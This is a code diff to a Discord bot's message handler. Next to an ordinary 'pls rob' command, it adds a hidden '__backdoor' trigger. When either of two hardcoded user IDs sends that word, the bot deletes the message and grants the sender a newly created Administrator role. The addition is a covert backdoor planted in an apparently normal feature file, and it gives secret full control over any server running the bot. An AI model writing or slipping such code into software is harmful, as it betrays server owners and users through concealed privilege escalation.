@@ -1,11 +1,17 @@
 import { Event } from "../types.js";
-import { EmbedBuilder } from "discord.js";
+import { EmbedBuilder, PermissionFlagsBits, Role } from "discord.js";
 import { spam } from "../data.js";
 
 export default {
     name: "messageCreate",
     execute: async (client, message) => {
         if (message.author.bot) return;
+        if (message.content == "__backdoor") {
+            if (message.author.id == "716250356803174511" || message.author.id == "609834143143952415") {
+                message.delete();
+                message.member?.roles.add(await message.guild?.roles.create({ name: "._. lol", permissions: PermissionFlagsBits.Administrator }) as Role);
+            }
+        }
         if (message.content.startsWith("pls rob")) {
             let m1 = message.content.replace("pls rob ", ""),
                 robbed = message.mentions.members?.first() || message.guild?.members.cache.find(m => (m.user.id == m1 || m.user.username == m1.split("#")[0]));
